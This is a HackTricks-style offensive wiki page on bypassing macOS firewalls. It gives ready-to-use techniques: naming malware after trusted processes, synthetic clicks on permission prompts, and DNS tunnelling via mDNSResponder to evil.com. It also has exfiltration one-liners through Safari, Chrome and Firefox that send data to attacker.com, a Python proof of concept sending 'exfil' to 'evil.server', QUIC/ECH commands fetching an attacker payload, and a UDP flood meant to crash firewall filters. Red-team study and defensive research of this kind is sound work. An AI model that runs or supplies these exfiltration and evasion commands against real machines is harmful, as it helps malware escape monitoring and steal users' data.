---
title: "macOS Bypassing Firewalls"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/macos-hardening/macos-security-and-privilege-escalation/macos-bypassing-firewalls.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: misc
---

## Found techniques

The following techniques were found working in some macOS firewall apps.

### Abusing whitelist names

- For example calling the malware with names of well known macOS processes like **`launchd`**

### Synthetic Click

- If the firewall ask for permission to the user make the malware **click on allow**

### **Use Apple signed binaries**

**Use Apple signed binaries**

- Like **`curl`** , but also others like**`whois`**

### Well known apple domains

The firewall could be allowing connections to well known apple domains such as **`apple.com`** or **`icloud.com`**. And iCloud could be used as a C2.

### Generic Bypass

Some ideas to try to bypass firewalls

### Check allowed traffic

Knowing the allowed traffic will help you identify potentially whitelisted domains or which applications are allowed to access them

```
lsof -i TCP -sTCP:ESTABLISHED
```
### Abusing DNS

On macOS a process does **not** talk to the DNS server itself. Name resolution is brokered over **XPC** by **`mDNSResponder`** (`/usr/sbin/mDNSResponder`), an Apple-signed system daemon, so every lookup on the machine leaves the host as traffic **from `mDNSResponder`** instead of from the process that wanted it. Firewalls therefore tend to trust that daemon unconditionally — denying it would break name resolution for the whole system.[\[1\]](#references)

That makes DNS a channel that stays open even when the firewall blocks the malware’s own sockets:[\[1\]](#references)

1. The malware tries to connect to `evil.com` . Its**own** outbound connection is examined by the firewall and**blocked** .
2. The malware instead asks `mDNSResponder` to**resolve**`evil.com` , over XPC.
3. The firewall examines the resulting query, sees the trusted Apple-signed resolver as the originator, and **allows it** .
4. The query reaches the DNS server — and if the attacker runs the authoritative server for `evil.com` , they control both ends of the exchange.

Since the attacker owns that zone, no “connection” is ever needed: data is smuggled out inside the **queried labels** (e.g. `<encoded-chunk>.evil.com`) and commands come back inside the **answer records** (TXT, A, CNAME…), which is classic DNS tunnelling riding on a fully whitelisted process.

Any unprivileged process can drive the daemon directly, which is an easy way to confirm the path is open:

```
# resolution is performed by mDNSResponder on the caller's behalf
dns-sd -G v4v6 evil.com
```
### Via Browser apps

- **oascript**

```
tell application "Safari"
    run
    tell application "Finder" to set visible of process "Safari" to false
    make new document
    set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome

```
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox

```
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari

```
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Via processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**

**CVE-2024-44206**

In July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web content filter” used by Screen Time parental controls.
A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.[\[2\]](#references)

Practical test (un-patched system):

```
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Packet Filter (PF) rule-ordering bug in early macOS 14 “Sonoma”

During the macOS 14 beta cycle Apple introduced a regression in the userspace wrapper around **`pfctl`**.
Rules that were added with the `quick` keyword (used by many VPN kill-switches) were silently ignored, causing traffic leaks even when a VPN/firewall GUI reported *blocked*. The bug was confirmed by several VPN vendors and fixed in RC 2 (build 23A344).[\[6\]](#references)

Quick leak-check:

```
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)

Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.[\[3\]](#references)

Example proof-of-concept (pre-11.2):

```
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH to evade Network Extension domain filters (macOS 12+)

NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.[\[5\]](#references)

Minimal PoC:

```
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
  --enable-quic --origin-to-force-quic-on=attacker.com:443 \
  --enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
  https://attacker.com/payload
# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.

### macOS 15 “Sequoia” Network Extension instability (2024–2025)

Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.[\[4\]](#references)

Quick reproduction (safe lab box):

```
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
## Tooling tips for modern macOS

1. Inspect current PF rules that GUI firewalls generate:
```
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Enumerate binaries that already hold the *outgoing-network* entitlement (useful for piggy-backing):```
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
    | plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Programmatically register your own Network Extension content filter in Objective-C/Swift.
 A minimal rootless PoC that forwards packets to a local socket is available in Patrick Wardle’s**LuLu** source code.

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
